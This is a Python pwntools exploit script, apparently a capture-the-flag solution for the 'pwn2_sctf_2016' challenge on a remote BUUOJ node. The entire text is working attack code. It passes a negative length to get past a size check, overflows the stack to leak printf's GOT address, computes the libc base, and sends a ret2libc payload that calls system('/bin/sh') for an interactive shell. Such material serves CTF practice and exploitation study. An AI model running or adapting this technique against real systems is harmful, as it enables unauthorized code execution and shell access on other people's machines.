from pwn import *
from LibcSearcher import *
#sh = process("./pwn2_sctf_2016")
sh = remote("node5.buuoj.cn",28196)
elf = ELF("./pwn2_sctf_2016")
libc = ELF("./BuuLibc/16-32.so")

vuln = 0x804852F
printf_plt = elf.plt['printf']
printf_got = elf.got['printf']
fmt = 0x80486F8
main= 0x080485b8

sh.recvuntil(b"read? ")
sh.sendline(b"-1")
sh.recvuntil(b"data!\n")

payload1 = b"a"*(0x2c+4)+p32(printf_plt)+p32(vuln)+p32(printf_got)
sh.sendline(payload1)
sh.recvuntil('\n')
printf_addr = u32(sh.recv(4))
print(hex(printf_addr))

libc_printf = libc.symbols['printf']
base = printf_addr - libc_printf
system = base + libc.symbols['system']
binsh = base + next(libc.search(b"/bin/sh"))

sh.recvuntil(b"read? ")
sh.sendline(b"-1")
sh.recvuntil(b"data!\n")

payload2 = b"a"*(0x2c+4)+p32(system)+p32(vuln)+p32(binsh)
sh.sendline(payload2)


sh.interactive()















